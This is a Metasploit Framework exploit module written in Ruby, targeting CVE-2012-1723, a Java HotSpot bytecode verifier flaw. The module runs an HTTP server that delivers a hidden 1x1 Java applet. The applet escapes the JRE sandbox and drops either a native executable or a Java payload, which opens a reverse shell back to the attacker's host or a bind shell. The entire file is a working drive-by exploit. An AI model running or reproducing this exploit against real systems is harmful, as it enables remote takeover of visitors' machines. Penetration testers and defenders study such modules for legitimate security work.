##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({ :javascript => false })

	def initialize( info = {} )
		super( update_info( info,
			'Name'           => 'Java Applet Field Bytecode Verifier Cache Remote Code Execution',
			'Description'    => %q{
					This module exploits a vulnerability in HotSpot bytecode verifier where an invalid
				optimisation of GETFIELD/PUTFIELD/GETSTATIC/PUTSTATIC instructions leads to insufficent
				type checks. This allows a way to escape the JRE sandbox, and load additional classes
				in order to perform malicious operations.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Stefan Cornellius',     # Discoverer
					'mihi',                  # Vuln analysis
					'littlelightlittlefire', # metasploit module
					'juan vazquez',          # merged code (overlapped)
					'sinn3r'                 # merged code (overlapped)
				],
			'References'     =>
				[
					['CVE', '2012-1723'],
					['OSVDB', '82877'],
					['BID', '52161'],
					['URL', 'http://schierlm.users.sourceforge.net/CVE-2012-1723.html'],
					['URL', 'http://www.oracle.com/technetwork/topics/security/javacpujun2012-1515912.html'],
					['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=829373'],
					['URL', 'http://icedtea.classpath.org/hg/release/icedtea7-forest-2.1/hotspot/rev/253e7c32def9'],
					['URL', 'http://icedtea.classpath.org/hg/release/icedtea7-forest-2.1/hotspot/rev/8f86ad60699b']
				],
			'Platform'       => [ 'java', 'win', 'osx', 'linux', 'solaris' ],
			'Payload'        => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
			'Targets'        =>
				[
					[ 'Generic (Java Payload)',
						{
							'Platform' => ['java'],
							'Arch' => ARCH_JAVA
						}
					],
					[ 'Windows x86 (Native Payload)',
						{
							'Platform' => 'win',
							'Arch' => ARCH_X86
						}
					],
					[ 'Mac OS X PPC (Native Payload)',
						{
							'Platform' => 'osx',
							'Arch' => ARCH_PPC
						}
					],
					[ 'Mac OS X x86 (Native Payload)',
						{
							'Platform' => 'osx',
							'Arch' => ARCH_X86
						}
					],
					[ 'Linux x86 (Native Payload)',
						{
							'Platform' => 'linux',
							'Arch' => ARCH_X86
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 06 2012'
		))
	end


	def exploit
		# load the static jar file
		path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2012-1723.jar" )
		fd = File.open( path, "rb" )
		@jar_data = fd.read(fd.stat.size)
		fd.close

		super
	end


	def on_request_uri( cli, request )
		data = ""
		host = ""
		port = ""

		if not request.uri.match(/\.jar$/i)
			if not request.uri.match(/\/$/)
				send_redirect( cli, get_resource() + '/', '')
				return
			end

			print_status("Sending #{self.name}")

			payload = regenerate_payload( cli )
			if not payload
				print_error("Failed to generate the payload." )
				return
			end

			if target.name == 'Generic (Java Payload)'
				if datastore['LHOST']
					jar  = payload.encoded
					host = datastore['LHOST']
					port = datastore['LPORT']
					vprint_status("Sending java reverse shell")
				else
					port = datastore['LPORT']
					datastore['RHOST'] = cli.peerhost
					vprint_status( "Java bind shell" )
				end
				if jar
					print_status( "Generated jar to drop (#{jar.length} bytes)." )
					jar = Rex::Text.to_hex( jar, prefix="" )
				else
					print_error("Failed to generate the executable." )
					return
				end
			else

				# NOTE: The EXE mixin automagically handles detection of arch/platform
				data = generate_payload_exe

				if data
					print_status("Generated executable to drop (#{data.length} bytes)." )
					data = Rex::Text.to_hex( data, prefix="" )
				else
					print_error("Failed to generate the executable." )
					return
				end

			end

			send_response_html( cli, generate_html( data, jar, host, port ), { 'Content-Type' => 'text/html' } )
			return
		end

		print_status("Sending jar")
		send_response( cli, generate_jar(), { 'Content-Type' => "application/octet-stream" } )

		handler( cli )
	end

	def generate_html( data, jar, host, port )
		jar_name = rand_text_alpha(rand(6)+3) + ".jar"

		html  = "<html><head></head>"
		html += "<body>"
		html += "<applet archive=\"#{jar_name}\" code=\"cve1723.Attacker\" width=\"1\" height=\"1\">"
		html += "<param name=\"data\" value=\"#{data}\"/>" if data
		html += "<param name=\"jar\" value=\"#{jar}\"/>" if jar
		html += "<param name=\"lhost\" value=\"#{host}\"/>" if host
		html += "</applet></body></html>"
		return html
	end

	def generate_jar()
		@jar_data
	end

end


